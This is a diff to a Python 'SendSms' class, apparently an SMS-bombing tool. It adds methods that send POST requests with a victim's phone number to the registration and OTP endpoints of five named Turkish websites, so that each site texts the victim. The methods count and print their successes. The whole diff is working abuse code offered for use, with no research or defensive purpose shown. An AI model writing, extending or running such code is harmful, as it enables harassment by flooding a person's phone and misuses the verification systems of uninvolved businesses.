@@ -765,3 +765,80 @@ class SendSms():
                 raise
         except:
             print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> carrefoursa.com.tr")
+
+
+     #kigili.com
+     def Kigili(self):
+         try:
+             url = "https://www.kigili.com/users/registration/"
+             headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Content-Type": "application/json"}
+             data = {"confirm": "true", "kvkk": "true", "phone": self.phone}
+             r = requests.post(url, headers=headers, json=data, timeout=6)
+             if r.status_code == 200:
+                 print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> kigili.com")
+                 self.adet += 1
+             else:
+                  raise
+         except:
+             print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> kigili.com")
+
+    #sakasu.com.tr
+    def Sakasu(self):
+        try:
+            url = "https://www.sakasu.com.tr/app/api_register/step1"
+            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept-Language": "tr-TR,en;q=0.9", "Content-Type": "application/json"}
+            data = {"kvkk": "true", "contact": "true", "confirm": "true", "phone": self.phone}
+            r = requests.post(url, headers=headers, json=data, timeout=6)
+            if r.status_code == 200:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> sakasu.com.tr")
+                self.adet += 1
+            else:
+                 raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> sakasu.com.tr")
+
+    #ipragaz.com.tr
+    def Ipragaz(self):
+        try:
+            url = "https://ipapp.ipragaz.com.tr/ipragazmobile/v2/ipragaz-b2c/ipragaz-customer/mobile-register-otp"
+            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept-Language": "en-TR;q=1.0, tr-TR;q=0.9", "Content-Type": "application/json"}
+            json = {"phone": self.phone}
+            r = requests.post(url, headers=headers, json=json, timeout=6)
+            if r.status_code == 200:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> ipragaz.com.tr")
+                self.adet += 1
+            else:
+                 raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> ipragaz.com.tr")
+
+
+    #happy.com.tr
+    def Happy(self):
+        try:
+            url = "https://www.happy.com.tr/index.php?route=account/register/verifyPhone"
+            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Origin": "https://www.happy.com.tr", "Referer": "https://www.happy.com.tr/index.php?route=account/register", "Content-Type": "application/x-www-form-urlencoded"}
+            data = {"phone": self.phone}
+            r = requests.post(url, headers=headers, data=data, timeout=6)
+            if r.status_code == 200:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> happy.com.tr")
+                self.adet += 1
+            else:
+                 raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> happy.com.tr")
+
+    #kuryemgelsin.com
+    def KuryemGelsin(self):
+        try:
+            url = "https://api.kuryemgelsin.com/tr/api/users/registerMessage/"
+            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept-Language": "tr-TR,tr;q=0.9", "Content-Type": "application/json"}
+            json = {"phone_country_code": "+90", "phone": self.phone}
+            r = requests.post(url, headers=headers, json=json, timeout=6)
+            if r.status_code == 200:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> kuryemgelsin.com")
+                self.adet += 1
+            else:
+                 raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> kuryemgelsin.com")
